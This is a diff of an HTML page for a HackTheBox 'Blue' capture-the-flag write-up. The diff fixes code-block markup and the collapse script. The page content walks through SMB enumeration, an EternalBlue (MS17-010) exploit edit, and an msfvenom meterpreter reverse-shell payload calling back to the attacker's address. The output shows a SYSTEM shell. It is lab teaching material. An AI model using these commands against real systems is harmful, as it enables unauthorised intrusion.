@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,14 +33,14 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">[HackTheBox] Blue</h1>
-                  <p class="nested"><a href="/posts/20191101_htb-legacy.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191104_htb-granny.html"> » </a></p>
+                  <p><a href="/posts/20191101_htb-legacy.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191104_htb-granny.html"> » </a></p>
                 <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested"><img alt="writeup.metadata.infocard" src="/static/files/posts_htb_blue/infocard.png" /></p>
 <p class="nested">This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/51">Blue</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_blue/killchain.png" /></p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
-<p class="nested"re><code># Nmap 7.70 scan initiated Fri Nov  1 17:05:41 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/xml/_quick_tcp_nmap.xml 10.10.10.40
+<pre class="nested"><code># Nmap 7.70 scan initiated Fri Nov  1 17:05:41 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/xml/_quick_tcp_nmap.xml 10.10.10.40
 Nmap scan report for 10.10.10.40
 Host is up, received user-set (0.15s latency).
 Scanned at 2019-11-01 17:05:41 PDT for 171s
@@ -110,13 +77,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre>
 
 <p class="nested">2. We find SMB ports to be open on the target system. We run a Nmap NSE script scan to check if the SMB service is vulnerable:  </p>
-<p class="nested"re><code>nmap -p139,445 --script smb-vuln-* --script-args=unsafe=1 10.10.10.40
+<pre class="nested"><code>nmap -p139,445 --script smb-vuln-* --script-args=unsafe=1 10.10.10.40
 </code></pre>
 
 <p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_blue/screenshot01.png" />  </p>
 <p class="nested">3. We find that the target system is missing patches from <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">MS17-010</a> bulletin and as such vulnerable. We can use the <a href="https://github.com/worawit/MS17-010">zzz_exploit.py</a> EternalBlue exploit to gain interactive access. But before that we need to determine the target OS version and the name of an active pipe:  </p>
 <p class="nested">4. We first use Metasploit auxiliary module <code>scanner/smb/smb_version</code> to determine target OS version to be <code>Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)</code>:  </p>
-<p class="nested"re><code>msfconsole
+<pre class="nested"><code>msfconsole
   use auxiliary/scanner/smb/smb_version
   show options
   set RHOSTS 10.10.10.40
@@ -125,7 +92,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_blue/screenshot02.png" />  </p>
 <p class="nested">5. Then we use another Metasploit auxiliary module <code>scanner/smb/pipe_auditor</code> to find multiple open pipes <code>\netlogon, \lsarpc, \samr, \browser, \atsvc, \epmapper, \eventlog, \InitShutdown, \keysvc, \lsass, \LSM_API_service, \ntsvcs, \plugplay, \protected_storage, \scerpc, \srvsvc, \trkwks, \W32TIME_ALT, \wkssvc</code>:  </p>
-<p class="nested"re><code>msfconsole
+<pre class="nested"><code>msfconsole
   use auxiliary/scanner/smb/pipe_auditor
   show options
   set RHOSTS 10.10.10.40
@@ -134,8 +101,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p class="nested"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_htb_blue/screenshot03.png" />  </p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4>Open Ports:</h4>
-<p class="nested"re><code>135/tcp    |  msrpc         |  Microsoft Windows RPC
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>135/tcp    |  msrpc         |  Microsoft Windows RPC
 139/tcp    |  netbios-ssn   |  Microsoft Windows netbios-ssn
 445/tcp    |  microsoft-ds  |  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
 49152/tcp  |  msrpc         |  Microsoft Windows RPC
@@ -148,7 +115,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We now need to create a binary payload file. For this exploit, we will use <code>meterpreter</code> as the payload and then use <code>multi/handler</code> to catch the incoming shell connection. We then slightly tweak the exploit file to first copy the binary payload on to the target system and execute it:  </p>
-<p class="nested"re><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.18 lport=443 -f exe &gt;mtrptr.exe
+<pre class="nested"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.18 lport=443 -f exe &gt;mtrptr.exe
 subl zzz_exploit.py
   def smb_pwn(conn, arch):
     smbConn = conn.get_smbconnection()
@@ -178,7 +145,7 @@ msfconsole
 <p class="nested"><img alt="writeup.exploitation.steps.1.4" src="/static/files/posts_htb_blue/screenshot07.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.1.5" src="/static/files/posts_htb_blue/screenshot08.png" />  </p>
 <p class="nested">2. We then obtain further information about the system and read the contents of both user.txt and root.txt files to comeplete the challenge:  </p>
-<p class="nested"re><code>sysinfo
+<pre class="nested"><code>sysinfo
 cat C:\Users\haris\Desktop\user.txt
 cat C:\Users\haris\Desktop\root.txt
 </code></pre>
@@ -187,7 +154,7 @@ cat C:\Users\haris\Desktop\root.txt
 <p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_blue/screenshot10.png" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_htb_blue/screenshot11.png" />  </p>
 <h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<p class="nested"re><code>ntauth/system@HARIS-PC&gt; id
+<pre class="nested"><code>ntauth/system@HARIS-PC&gt; id
 NT AUTHORITY\SYSTEM
 ntauth/system@HARIS-PC&gt;  
 ntauth/system@HARIS-PC&gt; uname
@@ -217,7 +184,7 @@ haris
 
 <h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
-<p class="nested"re><code>C:\Users\haris\Desktop\user.txt: 4c546aea7dbee75cbd7.............
+<pre class="nested"><code>C:\Users\haris\Desktop\user.txt: 4c546aea7dbee75cbd7.............
 C:\Users\Administrator\Desktop\root.txt: ff548eb71e920ff6c0..............
 </code></pre>
 
@@ -226,19 +193,17 @@ C:\Users\Administrator\Desktop\root.txt: ff548eb71e920ff6c0..............
 <li><a href="https://www.hackthebox.eu/home/machines/profile/51">https://www.hackthebox.eu/home/machines/profile/51</a>  </li>
 <li><a href="https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125">https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125</a>  </li>
 </ul>
-        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p class="nested" style="text-align:center;">« <a href="/posts/20191101_htb-legacy.html">[HackTheBox] Legacy...</a> « | » <a href="/posts/20191104_htb-granny.html">[HackTheBox] Granny...</a> »</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20191101_htb-legacy.html">[HackTheBox] Legacy...</a> « | » <a href="/posts/20191104_htb-granny.html">[HackTheBox] Granny...</a> »</p>
             </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
     <script>
       function toggle(elem) {
         elem.classList.toggle("expanded");
-
-        var ish2 = false; var ish3 = false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
-        console.log(elem); console.log(ish2); console.log(ish3);
-
+        var ish2=false; var ish3=false; var ish4=false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
+        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
         var sibling = elem.nextElementSibling;
         while (sibling) {
           if (ish2 && sibling.classList.contains("h2")) {
@@ -246,6 +211,10 @@ C:\Users\Administrator\Desktop\root.txt: ff548eb71e920ff6c0..............
             break;
           }
           if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
             sibling.classList.toggle("active");
             break;
           }
